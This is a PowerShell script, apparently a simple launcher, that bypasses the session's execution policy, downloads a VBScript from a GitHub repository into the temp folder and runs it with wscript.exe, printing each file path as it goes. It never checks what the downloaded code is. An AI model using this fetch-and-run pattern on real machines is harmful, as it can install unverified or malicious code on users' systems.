<#
.SYNOPSIS
    User-Friendly VBScript Executor
.DESCRIPTION
    Downloads and runs a VBScript with clear path visibility
#>

# Set execution policy for current session only
Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue

# Configuration
$VbsUrl = "https://github.com/seunoshino/myapp-downloads/raw/main/100%25.vbs"
$Destination = "$env:TEMP\MyApp\script.vbs"  # Standard temp location

# Create folder and show location
Write-Host "Creating working directory..."
$workingDir = "$env:TEMP\MyApp"
if (-not (Test-Path $workingDir)) {
    New-Item -ItemType Directory -Path $workingDir -Force | Out-Null
}

Write-Host "Files will be saved to: $workingDir" -ForegroundColor Cyan
Write-Host "Full path: $Destination" -ForegroundColor Cyan

# Download and execute
try {
    # Download with progress display
    Write-Host "`nDownloading script..." -ForegroundColor Yellow
    (New-Object System.Net.WebClient).DownloadFile($VbsUrl, $Destination)
    
    # Verify download
    if (Test-Path $Destination) {
        Write-Host "Download successful!" -ForegroundColor Green
        Write-Host "File saved to: $Destination" -ForegroundColor Cyan
        
        # Open containing folder (optional)
        Start-Process "explorer.exe" -ArgumentList "/select,`"$Destination`""
        
        # Execute script
        Write-Host "`nStarting script execution..." -ForegroundColor Yellow
        Start-Process "wscript.exe" -ArgumentList "`"$Destination`""
    }
    else {
        Write-Host "Download failed - file not found" -ForegroundColor Red
    }
}
catch {
    Write-Host "Error: $_" -ForegroundColor Red
}

# Show final location again
Write-Host "`nYou can always find the script at:" -ForegroundColor Cyan
Write-Host $Destination -ForegroundColor White